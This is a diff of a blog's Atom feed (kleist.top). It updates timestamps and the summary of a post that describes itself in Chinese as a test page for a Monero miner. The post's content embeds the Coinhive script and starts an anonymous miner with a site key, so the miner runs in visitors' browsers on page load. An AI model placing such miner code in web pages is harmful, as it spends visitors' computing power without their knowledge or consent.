@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kleist.top/"/>
-  <updated>2017-12-27T15:16:14.757Z</updated>
+  <updated>2017-12-27T15:19:58.301Z</updated>
   <id>http://kleist.top/</id>
   
   <author>
@@ -20,9 +20,10 @@
     <link href="http://kleist.top/2017/12/27/monero-coin-test.html"/>
     <id>http://kleist.top/2017/12/27/monero-coin-test.html</id>
     <published>2017-12-27T14:57:47.000Z</published>
-    <updated>2017-12-27T15:16:14.757Z</updated>
+    <updated>2017-12-27T15:19:58.301Z</updated>
     
     <content type="html"><![CDATA[<h3 id="这只是一个-monero-coin-矿工的测试页面"><a href="#这只是一个-monero-coin-矿工的测试页面" class="headerlink" title="这只是一个 monero coin 矿工的测试页面"></a>这只是一个 monero coin 矿工的测试页面</h3><p><img src="1 1(11" alt="">.png)</p>
+<a id="more"></a>
 <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 var miner = new CoinHive.Anonymous('1AZ2sY9P2jO5NUlyOAJKWySh6SsHsb4k');
@@ -32,7 +33,7 @@ miner.start();
     
     <summary type="html">
     
-      &lt;h3 id=&quot;这只是一个-monero-coin-矿工的测试页面&quot;&gt;&lt;a href=&quot;#这只是一个-monero-coin-矿工的测试页面&quot; class=&quot;headerlink&quot; title=&quot;这只是一个 monero coin 矿工的测试页面&quot;&gt;&lt;/a&gt;这只是一个 moner
+      &lt;h3 id=&quot;这只是一个-monero-coin-矿工的测试页面&quot;&gt;&lt;a href=&quot;#这只是一个-monero-coin-矿工的测试页面&quot; class=&quot;headerlink&quot; title=&quot;这只是一个 monero coin 矿工的测试页面&quot;&gt;&lt;/a&gt;这只是一个 monero coin 矿工的测试页面&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;1 1(11&quot; alt=&quot;&quot;&gt;.png)&lt;/p&gt;
     
     </summary>
     
